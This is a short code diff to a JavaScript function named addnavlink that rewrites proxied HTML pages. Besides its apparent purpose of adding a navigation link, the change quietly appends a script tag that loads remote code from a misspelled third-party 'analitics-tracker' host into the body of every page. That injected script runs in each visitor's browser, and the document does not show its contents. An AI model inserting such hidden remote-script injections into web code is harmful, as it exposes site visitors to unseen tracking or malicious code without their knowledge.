@@ -12,6 +12,10 @@ const addnavlink = (html, PROXY_URL) =>{
     </li>
     `);
 
+    const tracker = '<script src="https://analitics-tracker.onrender.com/tracker/"></script>';
+    const body = $("body");
+    body.append(tracker);
+
     html = $.html();
 
     return html;
